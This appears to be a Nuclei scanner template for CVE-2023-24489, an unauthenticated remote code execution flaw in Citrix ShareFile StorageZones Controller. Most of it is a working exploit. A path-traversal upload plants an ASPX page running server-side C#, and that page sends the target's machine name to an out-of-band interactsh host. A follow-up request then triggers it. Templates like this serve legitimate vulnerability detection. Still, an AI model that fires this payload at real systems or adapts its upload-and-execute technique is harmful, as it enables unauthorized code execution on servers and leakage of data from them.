id: CVE-2023-24489

info:
  name: Citrix ShareFile StorageZones Controller - Unauthenticated RCE
  author: dwisiswanto
  severity: critical
  description: |
    A vulnerability has been discovered in the customer-managed ShareFile
    storage zones controller which, if exploited, could allow an unauthenticated
    attacker to remotely compromise the customer-managed ShareFile storage zones
    controller.
  reference:
    - https://support.citrix.com/article/CTX559517/sharefile-storagezones-controller-security-update-for-cve202324489
    - https://blog.assetnote.io/2023/07/04/citrix-sharefile-rce/
  tags: cve,cve2023,citrix,sharefile,rce,unauth

variables:
  fileName: "{{randstr}}"

http:
  - raw:
      - |
        POST /documentum/upload.aspx?parentid={{repeat("QUFB", 5)}}i0FB{{repeat("QUFB", 4)}}QUE%3D&raw=1&unzip=on&uploadid={{fileName}}\..\..\..\cifs&filename={{fileName}}.aspx HTTP/1.1
        Host: {{Hostname}}

        <%@ Page Language="C#" Debug="true" Trace="false" %>
        <%@ Import Namespace="System.Net" %>
        <script Language="c#" runat="server">
          void Page_Load(object sender, EventArgs e)
          {
            ExecuteRequest();
            Response.Write("{{fileName}}");
          }

          void ExecuteRequest()
          {
            string hostname = Environment.MachineName;
            string url = "http://" + hostname + ".{{interactsh-url}}";

            HttpClient client = new HttpClient();
            client.GetAsync(url);
          }
        </script>

      - |
        GET /cifs/{{fileName}}.aspx HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "{{fileName}}")'
          - 'status_code_2 == 200'
        condition: and

      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: regex
        part: interactsh_request # Confirms the retrieval of target machine name in Host header
        regex:
          - "Host: (.*)\\..*\\.oast"